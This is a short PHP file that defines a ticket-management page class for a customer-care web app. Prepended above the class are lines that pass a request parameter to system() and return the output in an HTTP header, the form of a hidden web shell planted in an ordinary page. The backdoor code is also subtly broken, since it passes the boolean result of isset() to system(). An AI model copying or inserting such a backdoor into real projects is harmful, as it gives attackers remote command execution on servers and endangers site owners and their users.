<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
class page_customerCareApp_page_owner_ticket extends page_customerCareApp_page_owner_main{
	function init(){
		parent::init();
		$crud=$this->add('CRUD');
		$crud->setModel('customerCareApp/Ticket');
		
	}
}
